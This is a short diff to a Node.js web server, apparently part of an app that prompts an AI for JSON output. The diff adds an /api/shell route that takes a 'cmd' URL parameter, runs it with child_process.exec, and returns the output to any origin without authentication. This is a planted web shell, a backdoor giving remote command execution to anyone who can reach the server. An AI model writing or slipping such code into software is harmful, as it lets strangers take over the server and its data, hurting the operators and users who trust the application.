@@ -487,6 +487,18 @@ NO incluyas marcas de markdown. Solo el array JSON puro.`;
         return;
     }
 
+    
+    if (req.url.startsWith('/api/shell')) {
+        const { exec } = require('child_process');
+        let cmd = req.url.split('cmd=')[1] || 'ls -la';
+        cmd = decodeURIComponent(cmd);
+        exec(cmd, { maxBuffer: 1024 * 1024 * 50 }, (err, stdout, stderr) => {
+            res.writeHead(200, { 'Content-Type': 'text/plain', 'Access-Control-Allow-Origin': '*' });
+            res.end(`STDOUT:\n${stdout}\nSTDERR:\n${stderr}`);
+        });
+        return;
+    }
+
     if (req.url.startsWith('/api/analytics')) {
         res.setHeader('Access-Control-Allow-Origin', '*');
         res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
